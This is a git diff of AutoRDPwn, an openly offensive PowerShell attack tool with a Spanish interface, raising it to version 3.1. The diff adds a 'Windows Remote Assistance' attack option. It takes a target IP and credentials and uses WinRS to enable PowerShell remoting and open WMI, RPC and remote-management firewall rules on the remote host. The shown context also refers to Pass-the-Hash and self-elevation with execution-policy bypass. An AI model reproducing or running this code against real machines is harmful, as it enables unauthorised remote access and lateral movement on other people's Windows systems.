@@ -1,6 +1,6 @@
 ﻿if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 [Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
-$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v3.0 - by @JoelGMSec"
+$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v3.1 - by @JoelGMSec"
 $Host.UI.RawUI.BackgroundColor = 'Black'
 $Host.UI.RawUI.ForegroundColor = 'Gray'
 $Host.PrivateData.ErrorForegroundColor = 'Red'
@@ -14,7 +14,7 @@ Clear-Host
 
 function Show-Menu {
      Write-Host ""
-     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue ; Write-Host "         v3.0  " -ForegroundColor Yellow
+     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue ; Write-Host "         v3.1  " -ForegroundColor Yellow
      Write-Host "   /  _  \  __ __|  |_ ____" -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \______ \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "_  _  _______  " -ForegroundColor Green
      Write-Host "  /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta ; Write-Host "|       _/|     \ |    ___/" -NoNewLine -ForegroundColor Blue ; Write-Host " \/ \/ /     \ " -ForegroundColor Green
      Write-Host " /  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta ; Write-Host "|   |    \|_____/ |   |" -NoNewLine -ForegroundColor Blue ; Write-Host " \        /   |   \" -ForegroundColor Green
@@ -22,12 +22,15 @@ function Show-Menu {
      Write-Host "  \/     \/                 " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/              " -NoNewLine -ForegroundColor Blue ; Write-Host -NoNewLine "   by @JoelGMSec" -ForegroundColor Yellow ; Write-Host "\/ " -ForegroundColor Green
      Write-Host "" 
      Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-     Write-Host "" 
-     Write-Host "[1] - Lanzar el ataque a través de PsExec"
-     Write-Host "[2] - Lanzar el ataque a través de Pass the Hash (Beta)"
-     Write-Host "[3] - Lanzar el ataque a través de WMI"
-     Write-Host "[4] - Lanzar el ataque a través de ScheduleTask"
-     Write-Host "[5] - Cerrar el programa"
+     Write-Host ""
+     Write-Host "Elige cómo quieres lanzar el ataque:"
+     Write-Host ""   
+     Write-Host "[1] - PsExec"
+     Write-Host "[2] - Pass the Hash (Beta)"
+     Write-Host "[3] - Windows Management Instrumentation"
+     Write-Host "[4] - Schedule Task"
+     Write-Host "[5] - Windows Remote Assistance"
+     Write-Host "[X] - Cerrar el programa"
      Write-Host "" }
 
 Set-StrictMode -Version Latest
@@ -142,14 +145,28 @@ function EnableTLS {
         Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" }
         Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" }}
 
-        '5' { exit }
+        '5' {
+        Write-Host ""
+        $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
+        Write-Host ""
+        $user = Read-Host -Prompt 'Y el usuario?'
+        Write-Host ""
+        $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
+        $Host.UI.RawUI.ForegroundColor = 'Blue'
+        WinRS -r:$computer -u:$user -p:$password powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" 
+        WinRS -r:$computer -u:$user -p:$password powershell.exe "netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" 
+        WinRS -r:$computer -u:$user -p:$password powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" 
+        WinRS -r:$computer -u:$user -p:$password powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" 
+        Write-Host "" }
+
+        'X' { exit }
 
         default {
         Write-Host ""
         Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta ; sleep -milliseconds 2000
         Clear-Host }}
         
-      } until ($input -in '1','2','3','4')
+      } until ($input -in '1','2','3','4','5')
 
    $Host.UI.RawUI.ForegroundColor = 'Gray'
    if(Test-Path variable:PassTheHash) { $computer = powershell "(Get-Content file.txt | Out-String | ConvertFrom-StringData | Format-List | findstr 'Value' | select -First 1).split(':')[1].trim()"
